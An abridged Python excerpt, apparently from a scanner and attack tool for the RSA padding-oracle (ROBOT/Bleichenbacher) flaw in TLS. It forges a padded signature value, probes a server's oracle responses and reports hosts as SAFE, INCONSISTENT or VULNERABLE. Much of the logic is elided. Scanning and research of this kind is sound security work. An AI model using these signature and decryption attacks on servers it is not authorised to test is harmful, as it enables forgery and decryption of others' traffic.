...
# Gobal variables used by multiple functions
timeout = 5
count = 0
countvalid = 0
port = 0
...
def perform_signature_attack(host, port, message, timeout=5, quiet=False, csv=False):
  try:
      ip = socket.gethostbyname(host)
      N, e = get_rsa_from_server(ip, port)
      modulus_bits = int(math.ceil(math.log(N, 2)))
      modulus_bytes = (modulus_bits + 7) // 8
      ciphertext = C = int("0001" + "ff" * (modulus_bytes - len(message) - 3) + "00" + "".join("{:02x}".format(ord(c)) for c in message), 16)
      perform_decrypt_attack(host, port, ciphertext, s_quiet=True, s_csv=False)
...
def perform_decrypt_attack(host_name, server_port, ciphertext, s_quiet=True, s_csv=False):
  global timeout, count, countvalid, port, ch, oracle_good, modulus_bits, flow, cke_2nd_prefix, quiet, csv, host, ip, enable_fastopen
  ...
  if not quiet:
      print("Scanning host %s ip %s port %i" % (host, ip, port))
  ...
  if (oracle_good == oracle_bad1 == oracle_bad2 == oracle_bad3 == oracle_bad4):
      ...
      if (oracle_good == oracle_bad1 == oracle_bad2 == oracle_bad3 == oracle_bad4):
          ...
          if csv:
              print("SAFE,%s,%s,,,,%s,%s,%s,%s,%s" % (host, ip, oracle_good, oracle_bad1, oracle_bad2, oracle_bad3, oracle_bad4))
          sys.exit(1)
      else:
          flow = True
  else:
  ...
  if (oracle_good != oracle_good_verify) or (oracle_bad1 != oracle_bad_verify1) or (oracle_bad2 != oracle_bad_verify2) or (oracle_bad3 != oracle_bad_verify3) or (oracle_bad4 != oracle_bad_verify4):
      ...
      if csv:
          print("INCONSISTENT,%s,%s,,,,%s,%s,%s,%s,%s" % (host, ip, oracle_good, oracle_bad1, oracle_bad2, oracle_bad3, oracle_bad4))
      quit()
  ...
  if csv:
      print("VULNERABLE,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s" % (host, ip, tlsver, oracle_strength, flowt, oracle_good, oracle_bad1, oracle_bad2, oracle_bad3, oracle_bad4))
  else:
